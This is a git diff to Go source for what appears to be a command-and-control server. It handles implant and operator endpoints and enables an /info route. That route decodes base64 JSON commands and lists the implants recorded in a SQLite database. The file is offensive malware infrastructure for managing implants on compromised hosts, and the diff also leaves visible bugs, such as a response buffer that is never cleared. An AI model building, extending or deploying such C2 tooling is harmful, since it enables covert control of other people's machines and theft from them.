@@ -5,6 +5,7 @@ import (
 	"net/http"
 	"net"
     "encoding/base64"
+    "bytes"
     "encoding/json"
     "io/ioutil"
     "database/sql"
@@ -28,6 +29,7 @@ var uidToImplantIDMap = make(map[string]int)
 var green = "\033[32m"
 // ANSI escape code to reset text format
 var reset = "\033[0m"
+var red = "\033[31m"
 
 type CommandQueueItem struct {
     Commands [][]string
@@ -61,7 +63,7 @@ func main() {
 func startServer() {
     http.HandleFunc("/implant", handleImplant)
     http.HandleFunc("/operator", handleOperator)
-    //http.HandleFunc("/info", handleServerCMDs)
+    http.HandleFunc("/info", handleServerCMDs)
     serverIP, err := getServerIP()
     if err != nil {
         log.Fatal("Error:", err)
@@ -252,46 +254,131 @@ func handleOperator(w http.ResponseWriter, r *http.Request) {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         // Server Commands
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
+var serverresp []string
 func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
     var receivestruct Command
+
+    // Read the request body
+    body, err := ioutil.ReadAll(r.Body)
+    if err != nil {
+        http.Error(w, fmt.Sprintf("Failed to read request body: %s", err), http.StatusBadRequest)
+        return
+    }
+
+    // Base64 decode the request body
+    decodedData, err := base64.StdEncoding.DecodeString(string(body))
+    if err != nil {
+        http.Error(w, fmt.Sprintf("Failed to decode base64 data: %s", err), http.StatusBadRequest)
+        return
+    }
+
     // Trim leading and trailing whitespace
     decodedData = bytes.TrimSpace(decodedData)
    
     err = json.Unmarshal(decodedData, &receivestruct)
     if err != nil {
-        return fmt.Errorf("Failed to unmarshal JSON: %s", err)
+        return
     }
 
-    fmt.Println("Cmd Group", receivestruct.Group)
-    fmt.Println("Cmd String:", receivestruct.String)
-    switch cmdGroup {
+    
+    cmdgroup := receivestruct.Group
+    cmdstring := receivestruct.String
+
+    switch cmdgroup {
     case "implant":
-        implantMgm()
+        switch cmdstring {
+        case "-l":
+            listImplants()
+        default:
+            fmt.Print(red)
+            fmt.Println("Invalid command for 'implant' group. Valid command is '-l' for listing implants.")
+            fmt.Print(reset)
+        }
     default:
         fmt.Print(red)
         fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
         fmt.Print(reset)
-        
-        continue
     }
+
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             // Respond to operator        
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-        
-    // Wait for the response from the implant
-    response := <-responseChan
+    serverrespStr := strings.Join(serverresp, "")
 
-    // Write the response back to the client
+    // Update the response structure with command response
+    receivestruct.Response = serverrespStr
+
+
+    jsonBytes, err := json.Marshal(receivestruct)
+    if err != nil {
+        fmt.Println("Error:", err)
+        return
+    }
+
+    // Encode the JSON as base64
+    response := base64.StdEncoding.EncodeToString(jsonBytes)
+
     w.Header().Set("Content-Type", "text/plain")
     w.WriteHeader(http.StatusOK)
     fmt.Fprintf(w, "Data: %s", response)
 }
 
-implantMgm()
+func listImplants() ([]string, error) {
+    idMasks, versionNames, uids, err := getVersionNamesAndUIDs()
+    if err != nil {
+        return nil, err
+    }
 
+    for i := range idMasks {
+        formattedImplant := fmt.Sprintf("-----------------------------\nID Mask: %s\nVersion Name: %s\nLast Check In: \nUID: %s\n-----------------------------\n", idMasks[i], versionNames[i], uids[i])
+        serverresp = append(serverresp, formattedImplant)
+    }
 
+    return serverresp, nil // Return serverresp and nil indicating no error
+}
+
+func getVersionNamesAndUIDs() ([]string, []string, []string, error) {
+    var idMasks []string
+    var versionNames []string
+    var uids []string
+
+    // Collect all ID masks from the uidToImplantIDMap
+    for _, idMask := range uidToImplantIDMap {
+        idMasks = append(idMasks, strconv.Itoa(idMask))
+    }
+
+    // Open a connection to the database
+    db, err := sql.Open("sqlite3", dbPath)
+    if err != nil {
+        return nil, nil, nil, fmt.Errorf("failed to open database connection: %s", err)
+    }
+    defer db.Close()
+
+    // Query the database for versionName and uid associated with each ID mask
+    for _, idMask := range idMasks {
+        var versionName string
+        var uid string
+
+        // Execute the query
+        row := db.QueryRow("SELECT versionName, uid FROM implants WHERE IDMask = ?", idMask)
+
+        // Scan the query result into variables
+        if err := row.Scan(&versionName, &uid); err != nil {
+            if err == sql.ErrNoRows {
+                // If no rows are found for the given ID mask, continue to the next one
+                continue
+            }
+            return nil, nil, nil, fmt.Errorf("failed to scan row: %s", err)
+        }
+
+        // Append versionName and uid to the slices
+        versionNames = append(versionNames, versionName)
+        uids = append(uids, uid)
+    }
+
+    return idMasks, versionNames, uids, nil
+}
 
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
